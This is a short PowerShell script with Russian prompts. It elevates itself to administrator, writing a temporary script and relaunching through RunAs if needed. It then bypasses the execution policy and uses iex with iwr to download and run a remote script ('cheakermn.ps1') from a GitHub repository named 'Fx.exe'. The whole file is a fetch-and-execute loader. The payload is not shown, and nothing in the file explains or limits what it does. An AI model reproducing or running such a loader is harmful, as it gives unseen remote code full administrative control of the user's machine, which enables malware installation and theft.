$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

if (-NOT $isAdmin) {
    $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
    $scriptContent = @'
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
Set-ExecutionPolicy Bypass -Scope Process -Force
iex (iwr 'https://github.com/kilordow/Fx.exe/raw/refs/heads/main/cheakermn.ps1' -UseBasicParsing).Content
Read-Host "Нажмите Enter для выхода"
'@
    $scriptContent | Out-File -FilePath $tempScript -Encoding UTF8
    Start-Process PowerShell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -NoExit -File `"$tempScript`""
    exit
}

Set-ExecutionPolicy Bypass -Scope Process -Force
iex (iwr 'https://github.com/kilordow/Fx.exe/raw/refs/heads/main/cheakermn.ps1' -UseBasicParsing).Content
Read-Host "Нажмите Enter для выхода"
